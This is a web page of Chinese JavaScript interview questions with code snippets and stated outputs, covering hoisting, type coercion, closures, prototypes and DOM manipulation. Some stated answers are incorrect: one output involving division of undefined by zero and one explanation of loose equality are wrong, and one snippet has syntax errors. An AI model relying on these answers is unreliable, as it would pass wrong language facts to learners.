  <span class="keyword">for</span> (<span class="keyword">var</span> s = i + <span class="number">1</span>; s &lt; arr.length; s++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr[s] == c)&#123;</span><br><span class="line">        <span class="comment">//debugger;</span></span><br><span class="line">        arr.splice(s,<span class="number">1</span>);</span><br><span class="line">        s--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(fn([<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">9</span>]).toString());</span><br></pre></td></tr></table></figure><h2 id="请写出一个程序"><a href="#请写出一个程序" class="headerlink" title="请写出一个程序"></a>请写出一个程序</h2><p>在页面加载完成后动态创建一个form表单，并在里面添加一个input对象并给它任意赋值后义post方式提交到：<code>http://127.0.0.1/save.php</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> form=<span class="built_in">document</span>.createElement(<span class="string">"form"</span>);</span><br><span class="line">  form.setAttribute(<span class="string">"method"</span>, <span class="string">"post"</span>);</span><br><span class="line">  form.setAttribute(<span class="string">"action"</span>, <span class="string">"http://127.0.0.1/save.php"</span>);</span><br><span class="line">  <span class="keyword">var</span> input=<span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</span><br><span class="line">  form.appendChild(input);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(form);</span><br><span class="line">  input.value=<span class="string">"cxc"</span>;</span><br><span class="line">  form.submit();<span class="comment">//提交表单</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24"><a href="#用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24" class="headerlink" title="用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24"></a>用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//升序算法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sort</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt;arr.length-i; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr[j]&gt;arr[j+<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">var</span> c=arr[j];<span class="comment">//交换两个变量的位置</span></span><br><span class="line">        arr[j]=arr[j+<span class="number">1</span>];</span><br><span class="line">        arr[j+<span class="number">1</span>]=c;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> arr.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(sort([<span class="number">23</span>,<span class="number">45</span>,<span class="number">18</span>,<span class="number">37</span>,<span class="number">92</span>,<span class="number">13</span>,<span class="number">24</span>]));</span><br></pre></td></tr></table></figure><h2 id="前端代码优化的方法"><a href="#前端代码优化的方法" class="headerlink" title="前端代码优化的方法"></a>前端代码优化的方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> User = &#123; </span><br><span class="line">  count = <span class="number">1</span>，</span><br><span class="line">  getCount：<span class="function"><span class="keyword">function</span>（）</span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.count;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(User.getCount());</span><br><span class="line"><span class="keyword">var</span> func = User.getCount;</span><br><span class="line"><span class="built_in">console</span>.log(func());</span><br></pre></td></tr></table></figure><p>输出结果：1 undefined（因为是window对象执行了func函数）;</p><h2 id="下列JavaScript代码执行后，依次alert的结果是"><a href="#下列JavaScript代码执行后，依次alert的结果是" class="headerlink" title="下列JavaScript代码执行后，依次alert的结果是"></a>下列JavaScript代码执行后，依次alert的结果是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a=b=<span class="number">5</span>;</span><br><span class="line">  alert(<span class="keyword">typeof</span> a);</span><br><span class="line">  alert(<span class="keyword">typeof</span> b);</span><br><span class="line">&#125;)();</span><br><span class="line">alert(<span class="keyword">typeof</span> a);</span><br><span class="line">alert(<span class="keyword">typeof</span> b);</span><br></pre></td></tr></table></figure><p>输出结果：<br>number<br>number<br>undefined<br>number</p><h2 id="下列JavaScript代码执行后，iNum的值是"><a href="#下列JavaScript代码执行后，iNum的值是" class="headerlink" title="下列JavaScript代码执行后，iNum的值是"></a>下列JavaScript代码执行后，iNum的值是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i&lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(i % <span class="number">5</span> == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iNum++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：答案：8</p><h2 id="输出结果是多少"><a href="#输出结果是多少" class="headerlink" title="输出结果是多少"></a>输出结果是多少</h2><p>1）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="keyword">var</span> b = a * <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (b == b) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(b * <span class="number">2</span> + <span class="string">"2"</span> - <span class="number">0</span> + <span class="number">4</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(!b * <span class="number">2</span> + <span class="string">"2"</span> - <span class="number">0</span> + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：26</p><p>2）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  var a;</span></span><br><span class="line"><span class="regexp">  var b = a * 0;</span></span><br><span class="line"><span class="regexp">  if (b == b) &#123;</span></span><br><span class="line"><span class="regexp">    console.log(b * 2 + "2" - 0 + 4);</span></span><br><span class="line"><span class="regexp">  &#125; else &#123;</span></span><br><span class="line"><span class="regexp">    console.log(!b * 2 + "2" - 0 + 4);</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><p>输出结果：6</p><p>3）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">t</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> t = t++;</span><br><span class="line">&#125;test(t);</span><br><span class="line"><span class="built_in">console</span>.log(t);</span><br></pre></td></tr></table></figure><p>输出结果：10</p><p>4）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">test</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> t = test++;</span><br><span class="line">&#125;test(t);</span><br><span class="line"><span class="built_in">console</span>.log(t);</span><br></pre></td></tr></table></figure><p>输出结果：10</p><p>5）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">test</span>)</span>&#123;</span><br><span class="line">  t = test++;</span><br><span class="line">&#125;test(t);</span><br><span class="line"><span class="built_in">console</span>.log(t);</span><br></pre></td></tr></table></figure><p>输出结果：10</p><p>6）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">test</span>)</span>&#123;</span><br><span class="line">  t = t + test;</span><br><span class="line">  <span class="built_in">console</span>.log(t);</span><br><span class="line">  <span class="keyword">var</span> t = <span class="number">3</span>;</span><br><span class="line">&#125;test(t);</span><br><span class="line"><span class="built_in">console</span>.log(t);</span><br></pre></td></tr></table></figure><p>输出结果：NaN 10</p><p>7）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="keyword">var</span> b = a / <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (b == b) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(b * <span class="number">2</span> + <span class="string">"2"</span> - <span class="number">0</span> + <span class="number">4</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(!b * <span class="number">2</span> + <span class="string">"2"</span> - <span class="number">0</span> + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：”26”</p><p>8）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  var a;</span></span><br><span class="line"><span class="regexp">  var b = a /</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (b == b) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(b * <span class="number">2</span> + <span class="string">"2"</span> + <span class="number">4</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(!b * <span class="number">2</span> + <span class="string">"2"</span> + <span class="number">4</span>); <span class="comment">// !Infinity --&gt;false</span></span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：Infinity24</p><ol><li>用程序实现找到html中id名相同的元素？</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=<span class="string">'form1'</span>&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div1'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div2'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div3'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div4'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div5'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div3'</span>&gt;id名重复的元素&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      <span class="keyword">var</span> nodes = <span class="built_in">document</span>.querySelectorAll(<span class="string">"#form1&gt;*"</span>);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = nodes.length; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> attr = nodes[i].getAttribute(<span class="string">"id"</span>);</span><br><span class="line">        <span class="keyword">var</span> s=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; len; j++)&#123;</span><br><span class="line">          <span class="keyword">if</span>(nodes[j].getAttribute(<span class="string">"id"</span>) == attr)&#123;</span><br><span class="line">            s++;</span><br><span class="line">            alert(<span class="string">"id为："</span> + attr + <span class="string">"的元素出现"</span> + s + <span class="string">"次"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure><p>输出结果：id为：div3的元素出现2次</p><h2 id="下列JavaScript代码执行后，运行的结果是"><a href="#下列JavaScript代码执行后，运行的结果是" class="headerlink" title="下列JavaScript代码执行后，运行的结果是"></a>下列JavaScript代码执行后，运行的结果是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;button id=<span class="string">'btn'</span>&gt;点击我&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  var btn = document.getElementById('btn');</span></span><br><span class="line"><span class="regexp">  var handler = &#123;</span></span><br><span class="line"><span class="regexp">      id: '_eventHandler',</span></span><br><span class="line"><span class="regexp">      exec: function()&#123;</span></span><br><span class="line"><span class="regexp">          alert(this.id);</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">  btn.addEventListener('click', handler.exec);</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><p>输出结果：”btn”</p><h2 id="下列JavaScript代码执行后，依次-alert-的结果"><a href="#下列JavaScript代码执行后，依次-alert-的结果" class="headerlink" title="下列JavaScript代码执行后，依次 alert 的结果"></a>下列JavaScript代码执行后，依次 alert 的结果</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">proto</span>: &#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">F.prototype = obj.proto;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> F();</span><br><span class="line">obj.proto.c = <span class="number">3</span>;</span><br><span class="line">obj.proto = &#123;<span class="attr">a</span>:<span class="number">-1</span>, <span class="attr">b</span>:<span class="number">-2</span>&#125;;</span><br><span class="line">alert(f.a); <span class="comment">// 1</span></span><br><span class="line">alert(f.c); <span class="comment">// 3</span></span><br><span class="line"><span class="keyword">delete</span> F.prototype[<span class="string">'a'</span>];</span><br><span class="line">alert(f.a); <span class="comment">// undefined</span></span><br><span class="line">alert(obj.proto.a);  <span class="comment">// -1</span></span><br></pre></td></tr></table></figure><h2 id="下列JavaScript代码执行后的效果是"><a href="#下列JavaScript代码执行后的效果是" class="headerlink" title="下列JavaScript代码执行后的效果是"></a>下列JavaScript代码执行后的效果是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul id=<span class="string">'list'</span>&gt;</span><br><span class="line">  &lt;li&gt;item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">  &lt;li&gt;item&lt;/</span>li&gt;</span><br><span class="line">  &lt;li&gt;item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">  &lt;li&gt;item&lt;/</span>li&gt;</span><br><span class="line">  &lt;li&gt;item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/u</span>l&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> items = <span class="built_in">document</span>.querySelectorAll(<span class="string">'#list &gt; li'</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; items.length; i++)&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      items[i].style.backgroundColor = <span class="string">'#fee'</span>;</span><br><span class="line">    &#125;, <span class="number">5</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：报错，因为i一直等于5，items[i]获取不到元素</p><h2 id="下列JavaScript代码执行后的-li-元素的数量是"><a href="#下列JavaScript代码执行后的-li-元素的数量是" class="headerlink" title="下列JavaScript代码执行后的 li 元素的数量是"></a>下列JavaScript代码执行后的 li 元素的数量是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;Item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;Item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;Item&lt;/</span>li&gt;</span><br><span class="line">&lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  var items = document.getElementsByTagName('li');</span></span><br><span class="line"><span class="regexp">  for(var i = 0; i &lt; items.length; i++)&#123;</span></span><br><span class="line"><span class="regexp">    if(items[i].innerHTML == '')&#123;</span></span><br><span class="line"><span class="regexp">      items[i].parentNode.removeChild(items[i]);</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><p>结果是：4</p><h2 id="程序中捕获异常的方法"><a href="#程序中捕获异常的方法" class="headerlink" title="程序中捕获异常的方法"></a>程序中捕获异常的方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.error;</span><br><span class="line">try&#123;&#125;catch()&#123;&#125;finally&#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="原型对象上添加方法"><a href="#原型对象上添加方法" class="headerlink" title="原型对象上添加方法"></a>原型对象上添加方法</h2><p>给String对象添加一个方法，传入一个 string 类型的参数，然后将 string 的每个字符间价格空格返回<br>例如：<code>addSpace(&quot;hello world&quot;) // -&gt; &#39;h e l l o w o r l d&#39;</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.spacify = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.split(<span class="string">''</span>).join(<span class="string">' '</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数组和字符串"><a href="#数组和字符串" class="headerlink" title="数组和字符串"></a>数组和字符串</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outPut</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.writeln(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">"lashou"</span>;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">outPut(b);</span><br><span class="line">a = <span class="string">"拉手"</span>;</span><br><span class="line">outPut(a);</span><br><span class="line">outPut(b);</span><br><span class="line"><span class="keyword">var</span> a_array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b_array = a_array;</span><br><span class="line">outPut(b_array);</span><br><span class="line">a_array[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line">outPut(a_array);</span><br><span class="line">outPut(b_array);</span><br></pre></td></tr></table></figure><p>输出结果：lashou 拉手 lashou 1,2,3 1,2,3,4 1,2,3,4</p><h2 id="下列控制台都输出什么"><a href="#下列控制台都输出什么" class="headerlink" title="下列控制台都输出什么"></a>下列控制台都输出什么</h2><p>第1题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function setName()&#123;</span><br><span class="line">  name=&quot;张三&quot;;</span><br><span class="line">&#125;</span><br><span class="line">setName();</span><br><span class="line">console.log(name); // 答案：&quot;张三&quot;</span><br></pre></td></tr></table></figure><p>第2题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//考点：1、变量声明提升 2、变量搜索机制</span><br><span class="line">var a=1;</span><br><span class="line">function test()&#123;</span><br><span class="line">  console.log(a); // 答案：undefined</span><br><span class="line">  var a=1;</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br></pre></td></tr></table></figure><p>第3题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var b=2;</span><br><span class="line">function test2()&#123;</span><br><span class="line">  window.b=3;</span><br><span class="line">  console.log(b); // 答案：3</span><br><span class="line">&#125;</span><br><span class="line">test2();</span><br></pre></td></tr></table></figure><p>第4题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=5;//声明一个全局变量c </span><br><span class="line">function test3()&#123;</span><br><span class="line">  window.c=3;</span><br><span class="line">  console.log(c);   //答案：undefined，原因：由于此时的c是一个局部变量c，并且没有被赋值</span><br><span class="line">  var c;</span><br><span class="line">  console.log(window.c);//答案：3，原因：这里的c就是一个全局变量c</span><br><span class="line">&#125;</span><br><span class="line">test3();</span><br></pre></td></tr></table></figure><p>第5题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var arr = [];</span><br><span class="line">arr[0]  = &apos;a&apos;;</span><br><span class="line">arr[1]  = &apos;b&apos;;</span><br><span class="line">arr[10] = &apos;c&apos;;</span><br><span class="line">alert(arr.length);  //答案：11</span><br><span class="line">console.log(arr[5]);  //答案：undefined</span><br></pre></td></tr></table></figure><p>第6题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a=1;</span><br><span class="line">console.log(a++);   //答案：1</span><br><span class="line">console.log(++a);   //答案：3</span><br></pre></td></tr></table></figure><p>第7题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">console.log(null==undefined); //答案：true</span><br><span class="line">console.log(&quot;1&quot;==1);    //答案：true，因为会将数字1先转换为字符串1</span><br><span class="line">console.log(&quot;1&quot;===1);   //答案：false，因为数据类型不一致</span><br></pre></td></tr></table></figure><p>第8题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typeof 1;   &quot;number&quot;</span><br><span class="line">typeof &quot;hello&quot;;   &quot;string&quot;</span><br><span class="line">typeof /[0-9]/;   &quot;object&quot;</span><br><span class="line">typeof &#123;&#125;;    &quot;object&quot;</span><br><span class="line">typeof null;    &quot;object&quot;</span><br><span class="line">typeof undefined; &quot;undefined&quot;</span><br><span class="line">typeof [1,2,3];   &quot;object&quot;</span><br><span class="line">typeof function()&#123;&#125;;  //&quot;function&quot;</span><br></pre></td></tr></table></figure><p>第9题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 